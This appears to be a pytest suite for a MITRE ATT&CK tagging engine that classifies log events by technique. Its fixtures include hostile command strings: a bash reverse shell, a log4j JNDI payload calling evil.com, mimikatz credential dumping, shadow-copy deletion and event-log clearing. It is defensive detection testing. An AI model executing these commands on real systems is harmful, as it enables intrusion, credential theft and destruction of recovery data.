"""Comprehensive unit test suite for the MITRE ATT&CK Tagger engine.

Validates multi-signal correlation across tactics (TA0001 - TA0040), technique
tagging, benign pass-through, custom rule injection, JSON ruleset loading,
in-memory LRU caching, telemetry audit reconciliation, and sub-10-microsecond SLA.
"""

from __future__ import annotations

import json
import time
import uuid
from pathlib import Path

import pytest

from logmorph.domain.uls import (
    DestinationInfo,
    LogFormatEnum,
    ParsingTierEnum,
    SecurityContext,
    SeverityEnum,
    UniversalLogEvent,
)
from logmorph.engine.enrichers.mitre import (
    MitreAttackTagger,
    MitreMetrics,
    get_mitre_tagger,
)
from logmorph.engine.parsers.base import ParsedResult
from logmorph.schemas.mitre import (
    MitreRule,
    MitreTacticEnum,
    MitreTaggerConfig,
)


@pytest.fixture
def isolated_mitre_tagger() -> MitreAttackTagger:
    """Return an isolated MitreAttackTagger instance with fresh metrics and cache."""
    metrics = MitreMetrics()
    config = MitreTaggerConfig(enabled=True, cache_size=1000, confidence_threshold=0.5)
    return MitreAttackTagger(config=config, metrics=metrics)


# ==============================================================================
# 1. Credential Access (TA0006) Tests
# ==============================================================================


def test_failed_logon_password_guessing(isolated_mitre_tagger: MitreAttackTagger) -> None:
    """Failed logon actions, Windows 4625, and SSH failed auth tag T1110.001."""
    # Test by Action
    evt_action = UniversalLogEvent(
        tenant_id=uuid.uuid4(),
        raw_log="User failed authentication",
        detected_format=LogFormatEnum.JSON,
        action="LOGIN_FAILED",
    )
    tags_action = isolated_mitre_tagger.tag_event(evt_action)
    assert len(tags_action) >= 1
    assert tags_action[0].technique_id == "T1110.001"
    assert tags_action[0].tactic_id == MitreTacticEnum.CREDENTIAL_ACCESS

    # Test by Windows Event ID 4625
    evt_eid = UniversalLogEvent(
        tenant_id=uuid.uuid4(),
        raw_log="An account failed to log on",
        detected_format=LogFormatEnum.CEF,
        attributes={"EventID": "4625"},
    )
    tags_eid = isolated_mitre_tagger.tag_event(evt_eid)
    assert len(tags_eid) >= 1
    assert tags_eid[0].technique_id == "T1110.001"

    # Test by Raw Syslog String
    evt_syslog = UniversalLogEvent(
        tenant_id=uuid.uuid4(),
        raw_log="sshd[1234]: Failed password for root from 192.168.1.50 port 49200 ssh2",
        detected_format=LogFormatEnum.SYSLOG,
    )
    tags_syslog = isolated_mitre_tagger.tag_event(evt_syslog)
    assert len(tags_syslog) >= 1
    assert tags_syslog[0].technique_id == "T1110.001"


def test_password_spray_matching(isolated_mitre_tagger: MitreAttackTagger) -> None:
    """Password spraying action or log signatures tag T1110.003."""
    evt = UniversalLogEvent(
        tenant_id=uuid.uuid4(),
        raw_log="Password spray attack detected against multiple domain accounts",
        detected_format=LogFormatEnum.JSON,
        action="PASSWORD_SPRAY",
    )
    tags = isolated_mitre_tagger.tag_event(evt)
    assert any(t.technique_id == "T1110.003" for t in tags)


def test_lsass_mimikatz_dump(isolated_mitre_tagger: MitreAttackTagger) -> None:
    """Mimikatz execution or LSASS memory reading tags T1003.001 with high confidence."""
    # Process Trigger
    evt_proc = UniversalLogEvent(
        tenant_id=uuid.uuid4(),
        raw_log="Suspicious process started",
        detected_format=LogFormatEnum.JSON,
        security=SecurityContext(process_name="mimikatz.exe"),
    )
    tags_proc = isolated_mitre_tagger.tag_event(evt_proc)
    assert any(t.technique_id == "T1003.001" for t in tags_proc)

    # Raw Log Trigger
    evt_raw = UniversalLogEvent(
        tenant_id=uuid.uuid4(),
        raw_log="sekurlsa::logonpasswords initiated against lsass.exe memory",
        detected_format=LogFormatEnum.JSON,
    )
    tags_raw = isolated_mitre_tagger.tag_event(evt_raw)
    assert any(t.technique_id == "T1003.001" for t in tags_raw)


# ==============================================================================
# 2. Execution (TA0002) Tests
# ==============================================================================


def test_powershell_execution(isolated_mitre_tagger: MitreAttackTagger) -> None:
    """Obfuscated or encoded PowerShell command execution tags T1059.001."""
    evt = UniversalLogEvent(
        tenant_id=uuid.uuid4(),
        raw_log="powershell.exe -ExecutionPolicy Bypass -enc SQBFAFgA...",
        detected_format=LogFormatEnum.JSON,
        security=SecurityContext(process_name="powershell.exe"),
    )
    tags = isolated_mitre_tagger.tag_event(evt)
    assert any(t.technique_id == "T1059.001" for t in tags)


def test_unix_reverse_shell_execution(isolated_mitre_tagger: MitreAttackTagger) -> None:
    """Interactive Unix shell or reverse TCP shell invocation tags T1059.004."""
    evt = UniversalLogEvent(
        tenant_id=uuid.uuid4(),
        raw_log="bash -i >& /dev/tcp/10.0.0.5/4444 0>&1",
        detected_format=LogFormatEnum.SYSLOG,
        security=SecurityContext(process_name="/bin/bash"),
    )
    tags = isolated_mitre_tagger.tag_event(evt)
    assert any(t.technique_id == "T1059.004" for t in tags)


def test_wmi_command_execution(isolated_mitre_tagger: MitreAttackTagger) -> None:
    """WMI process creation commands tag T1047."""
    evt = UniversalLogEvent(
        tenant_id=uuid.uuid4(),
        raw_log="wmic process call create 'calc.exe'",
        detected_format=LogFormatEnum.JSON,
        security=SecurityContext(process_name="wmic.exe"),
    )
    tags = isolated_mitre_tagger.tag_event(evt)
    assert any(t.technique_id == "T1047" for t in tags)


# ==============================================================================
# 3. Privilege Escalation (TA0004) Tests
# ==============================================================================


def test_sudo_privilege_escalation(isolated_mitre_tagger: MitreAttackTagger) -> None:
    """Linux sudo command execution tags T1548.003."""
    evt = UniversalLogEvent(
        tenant_id=uuid.uuid4(),
        raw_log="sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/bash",
        detected_format=LogFormatEnum.SYSLOG,
        action="SUDO_EXEC",
    )
    tags = isolated_mitre_tagger.tag_event(evt)
    assert any(t.technique_id == "T1548.003" for t in tags)


def test_uac_bypass_execution(isolated_mitre_tagger: MitreAttackTagger) -> None:
    """Known UAC bypass binaries (fodhelper, eventvwr) tag T1548.002."""
    evt = UniversalLogEvent(
        tenant_id=uuid.uuid4(),
        raw_log="Execution of fodhelper.exe triggering elevated UAC bypass",
        detected_format=LogFormatEnum.JSON,
        security=SecurityContext(process_name="fodhelper.exe"),
    )
    tags = isolated_mitre_tagger.tag_event(evt)
    assert any(t.technique_id == "T1548.002" for t in tags)


def test_special_privileges_assigned(isolated_mitre_tagger: MitreAttackTagger) -> None:
    """Windows Event ID 4672 tags T1078 (Valid Accounts)."""
    evt = UniversalLogEvent(
        tenant_id=uuid.uuid4(),
        raw_log="Special privileges assigned to new logon",
        detected_format=LogFormatEnum.CEF,
        attributes={"EventID": "4672"},
    )
    tags = isolated_mitre_tagger.tag_event(evt)
    assert any(t.technique_id == "T1078" for t in tags)


# ==============================================================================
# 4. Defense Evasion (TA0005) Tests
# ==============================================================================


def test_windows_event_log_clearing(isolated_mitre_tagger: MitreAttackTagger) -> None:
    """Windows Event ID 1102 or wevtutil cl commands tag T1070.001."""
    # By Event ID 1102
    evt_eid = UniversalLogEvent(
        tenant_id=uuid.uuid4(),
        raw_log="The audit log was cleared",
        detected_format=LogFormatEnum.CEF,
        attributes={"EventID": "1102"},
    )
    tags_eid = isolated_mitre_tagger.tag_event(evt_eid)
    assert any(t.technique_id == "T1070.001" for t in tags_eid)

    # By Process and Command
    evt_proc = UniversalLogEvent(
        tenant_id=uuid.uuid4(),
        raw_log="wevtutil cl Security",
        detected_format=LogFormatEnum.JSON,
        security=SecurityContext(process_name="wevtutil.exe"),
    )
    tags_proc = isolated_mitre_tagger.tag_event(evt_proc)
    assert any(t.technique_id == "T1070.001" for t in tags_proc)


# ==============================================================================
# 5. Discovery (TA0007) Tests
# ==============================================================================


def test_network_service_port_scan(isolated_mitre_tagger: MitreAttackTagger) -> None:
    """Nmap scans, PORT_SCAN action, and threat intel scanner triggers tag T1046."""
    # By action and process
    evt_scan = UniversalLogEvent(
        tenant_id=uuid.uuid4(),
        raw_log="SYN stealth port scan against 10.0.0.0/24",
        detected_format=LogFormatEnum.JSON,
        action="PORT_SCAN",
        security=SecurityContext(process_name="nmap"),
    )
    tags = isolated_mitre_tagger.tag_event(evt_scan)
    assert any(t.technique_id == "T1046" for t in tags)

    # By threat intel category trigger
    evt_intel = UniversalLogEvent(
        tenant_id=uuid.uuid4(),
        raw_log="Connection from scanner",
        detected_format=LogFormatEnum.JSON,
        attributes={"threat_intel": {"category": "SCANNER"}},
    )
    tags_intel = isolated_mitre_tagger.tag_event(evt_intel)
    assert any(t.technique_id == "T1046" for t in tags_intel)


# ==============================================================================
# 6. Lateral Movement (TA0008) Tests
# ==============================================================================


def test_rdp_lateral_movement(isolated_mitre_tagger: MitreAttackTagger) -> None:
    """RDP destination port 3389 or TermDD logs tag T1021.001."""
    evt = UniversalLogEvent(
        tenant_id=uuid.uuid4(),
        raw_log="RDP connection session initialized",
        detected_format=LogFormatEnum.JSON,
        destination=DestinationInfo(ip="10.0.0.15", port=3389),
    )
    tags = isolated_mitre_tagger.tag_event(evt)
    assert any(t.technique_id == "T1021.001" for t in tags)


def test_smb_admin_shares_psexec(isolated_mitre_tagger: MitreAttackTagger) -> None:
    """Port 445 with PsExec or ADMIN$ access tags T1021.002."""
    evt = UniversalLogEvent(
        tenant_id=uuid.uuid4(),
        raw_log="Connecting to remote host via ADMIN$ share",
        detected_format=LogFormatEnum.JSON,
        destination=DestinationInfo(ip="10.0.0.20", port=445),
        security=SecurityContext(process_name="psexec.exe"),
    )
    tags = isolated_mitre_tagger.tag_event(evt)
    assert any(t.technique_id == "T1021.002" for t in tags)


# ==============================================================================
# 7. Command and Control (TA0011) Tests
# ==============================================================================


def test_c2_threat_intel_cross_correlation(isolated_mitre_tagger: MitreAttackTagger) -> None:
    """C2 threat intel category or Cobalt Strike signatures tag T1071.001."""
    evt = UniversalLogEvent(
        tenant_id=uuid.uuid4(),
        raw_log="HTTP beacon check-in to external host",
        detected_format=LogFormatEnum.JSON,
        attributes={"threat_intel": {"category": "C2_SERVER"}},
    )
    tags = isolated_mitre_tagger.tag_event(evt)
    assert any(t.technique_id == "T1071.001" for t in tags)


def test_dns_tunneling_c2(isolated_mitre_tagger: MitreAttackTagger) -> None:
    """High-entropy or iodine DNS tunneling queries tag T1071.004."""
    evt = UniversalLogEvent(
        tenant_id=uuid.uuid4(),
        raw_log="DNS tunnel query detected using iodine daemon",
        detected_format=LogFormatEnum.JSON,
    )
    tags = isolated_mitre_tagger.tag_event(evt)
    assert any(t.technique_id == "T1071.004" for t in tags)


def test_tor_proxy_threat_intel_trigger(isolated_mitre_tagger: MitreAttackTagger) -> None:
    """TOR_EXIT_NODE threat category tags T1090.003 (Multi-hop Proxy)."""
    evt = UniversalLogEvent(
        tenant_id=uuid.uuid4(),
        raw_log="Inbound traffic from Tor relay",
        detected_format=LogFormatEnum.JSON,
        attributes={"threat_intel": {"category": "TOR_EXIT_NODE"}},
    )
    tags = isolated_mitre_tagger.tag_event(evt)
    assert any(t.technique_id == "T1090.003" for t in tags)


# ==============================================================================
# 8. Impact (TA0040) Tests
# ==============================================================================


def test_ransomware_data_encrypted(isolated_mitre_tagger: MitreAttackTagger) -> None:
    """WannaCry or file encryption actions tag T1486."""
    evt = UniversalLogEvent(
        tenant_id=uuid.uuid4(),
        raw_log="WannaCry cryptoworm payload encrypted corporate file shares",
        detected_format=LogFormatEnum.JSON,
        action="FILE_ENCRYPTED",
    )
    tags = isolated_mitre_tagger.tag_event(evt)
    assert any(t.technique_id == "T1486" for t in tags)


def test_inhibit_system_recovery(isolated_mitre_tagger: MitreAttackTagger) -> None:
    """vssadmin delete shadows commands tag T1490."""
    evt = UniversalLogEvent(
        tenant_id=uuid.uuid4(),
        raw_log="vssadmin delete shadows /all /quiet",
        detected_format=LogFormatEnum.JSON,
        security=SecurityContext(process_name="vssadmin.exe"),
    )
    tags = isolated_mitre_tagger.tag_event(evt)
    assert any(t.technique_id == "T1490" for t in tags)


# ==============================================================================
# 9. Initial Access & Persistence & Exfiltration Tests
# ==============================================================================


def test_spearphishing_link(isolated_mitre_tagger: MitreAttackTagger) -> None:
    """PHISHING threat intel tags T1566.002 (Spearphishing Link)."""
    evt = UniversalLogEvent(
        tenant_id=uuid.uuid4(),
        raw_log="Outbound connection to phish-secure-login portal",
        detected_format=LogFormatEnum.JSON,
        attributes={"threat_intel": {"category": "PHISHING"}},
    )
    tags = isolated_mitre_tagger.tag_event(evt)
    assert any(t.technique_id == "T1566.002" for t in tags)


def test_exploit_public_facing_app(isolated_mitre_tagger: MitreAttackTagger) -> None:
    """CVE exploit or log4j jndi payloads tag T1190."""
    evt = UniversalLogEvent(
        tenant_id=uuid.uuid4(),
        raw_log="GET / HTTP/1.1 User-Agent: ${jndi:ldap://evil.com/a} log4j cve-2021-44228",
        detected_format=LogFormatEnum.CLF,
    )
    tags = isolated_mitre_tagger.tag_event(evt)
    assert any(t.technique_id == "T1190" for t in tags)


def test_service_installation_persistence(isolated_mitre_tagger: MitreAttackTagger) -> None:
    """Windows Event ID 7045 tags T1543.003 (Windows Service)."""
    evt = UniversalLogEvent(
        tenant_id=uuid.uuid4(),
        raw_log="A service was installed in the system",
        detected_format=LogFormatEnum.CEF,
        attributes={"EventID": "7045"},
    )
    tags = isolated_mitre_tagger.tag_event(evt)
    assert any(t.technique_id == "T1543.003" for t in tags)


def test_data_exfiltration_alternative_protocol(isolated_mitre_tagger: MitreAttackTagger) -> None:
    """Data exfiltration actions tag T1048."""
    evt = UniversalLogEvent(
        tenant_id=uuid.uuid4(),
        raw_log="Large outbound data transfer to anomalous external address",
        detected_format=LogFormatEnum.JSON,
        action="DATA_EXFILTRATION",
    )
    tags = isolated_mitre_tagger.tag_event(evt)
    assert any(t.technique_id == "T1048" for t in tags)


# ==============================================================================
# 10. Benign Pass-Through Tests
# ==============================================================================


def test_benign_traffic_no_tags(isolated_mitre_tagger: MitreAttackTagger) -> None:
    """Legitimate web browsing, DNS queries, and cron tasks trigger zero tags."""
    benign_events = [
        UniversalLogEvent(
            tenant_id=uuid.uuid4(),
            raw_log="GET /index.html HTTP/1.1 200 OK",
            detected_format=LogFormatEnum.CLF,
            action="ALLOW",
        ),
        UniversalLogEvent(
            tenant_id=uuid.uuid4(),
            raw_log="CRON[500]: (root) CMD (/usr/local/bin/backup.sh)",
            detected_format=LogFormatEnum.SYSLOG,
        ),
        UniversalLogEvent(
            tenant_id=uuid.uuid4(),
            raw_log="Standard user logon session opened",
            detected_format=LogFormatEnum.JSON,
            action="LOGIN_SUCCESS",
        ),
    ]

    for b_evt in benign_events:
        assert isolated_mitre_tagger.tag_event(b_evt) == []


# ==============================================================================
# 11. Custom Rule Registration & File Loading
# ==============================================================================


def test_custom_rule_dynamic_registration(isolated_mitre_tagger: MitreAttackTagger) -> None:
    """Users can dynamically register custom ATT&CK detection rules."""
    custom_rule = MitreRule(
        rule_id="RULE_CUSTOM_APT_CAMPAIGN",
        tactic_id=MitreTacticEnum.COMMAND_AND_CONTROL,
        tactic_name="Command and Control",
        technique_id="T1071.999",
        technique_name="Custom APT Beaconing",
        confidence=0.99,
        action_patterns=[r"(?i)^apt_beacon$"],
        description="Custom rule for APT campaign detection.",
    )
    isolated_mitre_tagger.add_rule(custom_rule)

    evt = UniversalLogEvent(
        tenant_id=uuid.uuid4(),
        raw_log="Custom beacon payload",
        detected_format=LogFormatEnum.JSON,
        action="APT_BEACON",
    )
    tags = isolated_mitre_tagger.tag_event(evt)
    assert any(t.technique_id == "T1071.999" for t in tags)


def test_load_rules_from_json_file(
    isolated_mitre_tagger: MitreAttackTagger,
    tmp_path: Path,
) -> None:
    """External JSON rule definitions can be imported at runtime."""
    rule_data = [
        {
            "rule_id": "RULE_FILE_IMPORTED_TEST",
            "tactic_id": "TA0009",
            "tactic_name": "Collection",
            "technique_id": "T1115",
            "technique_name": "Clipboard Data",
            "confidence": 0.95,
            "raw_log_patterns": [r"(?i)clipboard\s+harvested"],
        }
    ]
    file_path = tmp_path / "custom_mitre_rules.json"
    file_path.write_text(json.dumps(rule_data), encoding="utf-8")

    initial_count = isolated_mitre_tagger.rule_count
    isolated_mitre_tagger.load_rules_from_file(str(file_path))
    assert isolated_mitre_tagger.rule_count == initial_count + 1

    evt = UniversalLogEvent(
        tenant_id=uuid.uuid4(),
        raw_log="Clipboard harvested from active session",
        detected_format=LogFormatEnum.JSON,
    )
    tags = isolated_mitre_tagger.tag_event(evt)
    assert any(t.technique_id == "T1115" for t in tags)


# ==============================================================================
# 12. LRU Cache & Performance SLA
# ==============================================================================


def test_lru_cache_hit_and_eviction(isolated_mitre_tagger: MitreAttackTagger) -> None:
    """Repeated evaluations leverage LRU cache and increment cache_hits counter."""
    evt = UniversalLogEvent(
        tenant_id=uuid.uuid4(),
        raw_log="Audit log was cleared",
        detected_format=LogFormatEnum.CEF,
        attributes={"EventID": "1102"},
    )

    # 1st evaluation: Cache miss
    tags1 = isolated_mitre_tagger.tag_event(evt)
    assert len(tags1) > 0

    # 2nd evaluation: Cache hit
    tags2 = isolated_mitre_tagger.tag_event(evt)
    assert tags1 == tags2

    snap = isolated_mitre_tagger.metrics.get_snapshot()
    assert snap.total_events_tagged == 2
    assert snap.cache_hits == 1
    assert snap.cache_misses == 1
    assert snap.matches_detected == 2

    # Clear cache
    isolated_mitre_tagger.clear_cache()
    assert isolated_mitre_tagger.cache_size == 0


def test_mitre_tagger_performance_sla(isolated_mitre_tagger: MitreAttackTagger) -> None:
    """10,000 cached evaluations must execute in < 0.05s (< 10us per scan)."""
    evt = UniversalLogEvent(
        tenant_id=uuid.uuid4(),
        raw_log="WannaCry cryptoworm payload detected",
        detected_format=LogFormatEnum.JSON,
        action="FILE_ENCRYPTED",
    )
    # Prime cache
    isolated_mitre_tagger.tag_event(evt)

    start = time.perf_counter()
    for _ in range(10000):
        isolated_mitre_tagger.tag_event(evt)
    duration = time.perf_counter() - start

    avg_us = (duration / 10000.0) * 1_000_000.0
    assert duration < 0.05, f"Took {duration:.4f}s; expected < 0.05s"
    assert avg_us < 10.0, f"Average scan {avg_us:.2f}us; expected < 10us"


# ==============================================================================
# 13. UniversalLogEvent & ParsedResult Enrichment
# ==============================================================================


def test_enrich_universal_log_event(isolated_mitre_tagger: MitreAttackTagger) -> None:
    """enrich_event populates enrichment and security MITRE fields on UniversalLogEvent."""
    evt = UniversalLogEvent(
        tenant_id=uuid.uuid4(),
        raw_log="Outbound beacon to C2 server",
        detected_format=LogFormatEnum.JSON,
        attributes={"threat_intel": {"category": "C2_SERVER"}},
        action="CONNECT",
    )

    enriched = isolated_mitre_tagger.enrich_event(evt)
    assert enriched.enrichment is not None
    assert enriched.enrichment.mitre_technique == "T1071.001"
    assert enriched.enrichment.mitre_tactic == MitreTacticEnum.COMMAND_AND_CONTROL
    assert enriched.security is not None
    assert enriched.security.mitre_technique == "T1071.001"
    assert "mitre_attack" in enriched.attributes
    assert enriched.attributes["mitre_attack"]["technique_name"] == "Web Protocols"


def test_enrich_parsed_result(isolated_mitre_tagger: MitreAttackTagger) -> None:
    """enrich_parsed_result populates attributes and security fields on ParsedResult."""
    res = ParsedResult(
        success=True,
        format=LogFormatEnum.JSON,
        parsed_by=ParsingTierEnum.RULE,
        confidence=1.0,
        raw_timestamp="2026-10-30T10:00:00Z",
        severity=SeverityEnum.ERROR,
        action="LOGIN_FAILED",
        attributes={"EventID": "4625"},
        security=SecurityContext(user="target_user"),
    )

    enriched = isolated_mitre_tagger.enrich_parsed_result(res)
    assert enriched.attributes.get("mitre_technique") == "T1110.001"
    assert enriched.attributes.get("mitre_tactic") == MitreTacticEnum.CREDENTIAL_ACCESS
    assert "mitre_attack" in enriched.attributes
    assert enriched.security is not None
    assert enriched.security.mitre_technique == "T1110.001"


# ==============================================================================
# 14. Disabled Toggle & Telemetry Reconciliation
# ==============================================================================


def test_mitre_tagger_disabled_toggle() -> None:
    """When enabled=False, tag_event returns empty and enrich_event does not modify event."""
    config = MitreTaggerConfig(enabled=False)
    tagger = MitreAttackTagger(config=config)

    evt = UniversalLogEvent(
        tenant_id=uuid.uuid4(),
        raw_log="User failed authentication",
        detected_format=LogFormatEnum.JSON,
        action="LOGIN_FAILED",
    )
    assert tagger.tag_event(evt) == []

    enriched = tagger.enrich_event(evt)
    assert enriched.enrichment is None or enriched.enrichment.mitre_technique is None


def test_telemetry_metrics_reconciliation(isolated_mitre_tagger: MitreAttackTagger) -> None:
    """Telemetry counters reconcile accurately: total == matches + untagged."""
    evt_match = UniversalLogEvent(
        tenant_id=uuid.uuid4(),
        raw_log="Mimikatz dumped credentials",
        detected_format=LogFormatEnum.JSON,
        security=SecurityContext(process_name="mimikatz.exe"),
    )
    evt_clean = UniversalLogEvent(
        tenant_id=uuid.uuid4(),
        raw_log="Clean traffic",
        detected_format=LogFormatEnum.JSON,
    )

    isolated_mitre_tagger.tag_event(evt_match)
    isolated_mitre_tagger.tag_event(evt_clean)

    snap = isolated_mitre_tagger.metrics.get_snapshot()
    assert snap.total_events_tagged == 2
    assert snap.matches_detected == 1
    assert snap.untagged_events == 1
    assert snap.tag_rate_pct == 50.0
    assert MitreTacticEnum.CREDENTIAL_ACCESS in snap.tactic_counts

    isolated_mitre_tagger.metrics.reset()
    snap_after = isolated_mitre_tagger.metrics.get_snapshot()
    assert snap_after.total_events_tagged == 0
    assert len(snap_after.tactic_counts) == 0


def test_default_singleton_accessor() -> None:
    """get_mitre_tagger returns a configured MitreAttackTagger singleton."""
    tagger = get_mitre_tagger()
    assert isinstance(tagger, MitreAttackTagger)
    assert tagger.rule_count >= 20
